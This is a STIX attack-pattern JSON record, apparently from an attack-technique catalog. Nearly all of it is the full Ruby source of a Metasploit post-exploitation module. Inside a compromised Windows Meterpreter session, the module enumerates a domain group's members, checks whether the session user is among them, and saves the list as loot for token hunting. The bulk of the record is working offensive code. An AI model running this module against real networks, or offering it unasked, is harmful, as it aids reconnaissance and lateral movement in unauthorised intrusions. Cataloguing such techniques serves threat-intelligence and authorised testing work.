{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd8a23b9-4f7e-4b6a-b095-1a8d585de591",
    "created": "2024-08-14T16:33:05.020433Z",
    "modified": "2024-08-14T16:33:05.020436Z",
    "name": "Windows Gather Enumerate Domain Group",
    "description": " This module extracts user accounts from the specified domain group and stores the results in the loot. It will also verify if session account is in the group. Data is stored in loot in a format that is compatible with the token_hunter plugin. This module must be run on a session running as a domain user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_domain_group_users.rb",
            "external_id": "enum_domain_group_users.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Enumerate Domain Group',\n        'Description' => %q{\n          This module extracts user accounts from the specified domain group\n          and stores the results in the loot. It will also verify if session\n          account is in the group. Data is stored in loot in a format that\n          is compatible with the token_hunter plugin. This module must be\n          run on a session running as a domain user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'Stephen Haywood <haywoodsb[at]gmail.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptString.new('GROUP', [true, 'Domain Group to enumerate', nil])\n    ])\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    group = datastore['GROUP']\n\n    fail_with(Failure::BadConfig, 'GROUP must be set.') if group.blank?\n\n    domain = get_domain_name\n\n    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') if domain.blank?\n\n    netbios_domain_name = domain.split('.').first.upcase\n\n    members = get_members_from_group(group, domain) || []\n\n    fail_with(Failure::Unknown, \"No members found for '#{domain}\\\\#{group}' group.\") if members.blank?\n\n    print_status(\"Found #{members.length} users in '#{domain}\\\\#{group}' group.\")\n\n    loot = []\n    members.each do |user|\n      print_status(\"\\t#{netbios_domain_name}\\\\#{user}\")\n      loot << \"#{netbios_domain_name}\\\\#{user}\"\n    end\n\n    user_domain, user = client.sys.config.getuid.split('\\\\')\n\n    if user_domain.downcase.include?(netbios_domain_name.downcase) && members.map { |u| u.downcase == user.downcase }.include?(true)\n      print_good(\"Current session running as #{domain}\\\\#{user} is a member of #{domain}\\\\#{group}!\")\n    else\n      print_status(\"Current session running as #{domain}\\\\#{user} is not a member of #{domain}\\\\#{group}\")\n    end\n\n    loot_file = store_loot(\n      'domain.group.members',\n      'text/plain',\n      session,\n      loot.join(\"\\n\"),\n      nil,\n      group\n    )\n\n    print_good(\"User list stored in #{loot_file}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}